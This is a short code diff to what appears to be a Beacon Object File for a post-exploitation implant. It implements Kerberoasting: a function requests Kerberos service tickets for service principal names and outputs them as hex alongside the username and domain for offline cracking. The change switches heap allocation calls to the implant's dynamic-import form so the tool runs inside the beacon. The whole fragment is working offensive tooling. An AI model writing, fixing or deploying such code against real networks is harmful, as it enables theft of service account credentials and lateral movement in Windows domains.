@@ -38,6 +38,9 @@ DECLSPEC_IMPORT SECURITY_STATUS SEC_ENTRY SECUR32$FreeContextBuffer(PVOID);
 DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
 DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
 DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetComputerNameExW(int, LPWSTR, LPDWORD);
+DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
+DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
 
 static void build_base_dn(const wchar_t *domain, wchar_t *dn, int dn_size) {
     dn[0] = L'\0';
@@ -131,7 +134,7 @@ static BOOL request_tgs_and_hash(CredHandle *cred, const wchar_t *spn,
 
     /* Allocate hex buffer (2 chars per byte + null) */
     int hex_size = ticket_len * 2 + 1;
-    char *hex_buf = (char *)HeapAlloc(GetProcessHeap(), 0, hex_size);
+    char *hex_buf = (char *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, hex_size);
     if (!hex_buf) {
         SECUR32$FreeContextBuffer(out_buf.pvBuffer);
         SECUR32$DeleteSecurityContext(&ctx);
@@ -156,7 +159,7 @@ static BOOL request_tgs_and_hash(CredHandle *cred, const wchar_t *spn,
             username, domain, hex_buf);
     }
 
-    HeapFree(GetProcessHeap(), 0, hex_buf);
+    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, hex_buf);
     SECUR32$FreeContextBuffer(out_buf.pvBuffer);
     SECUR32$DeleteSecurityContext(&ctx);
 
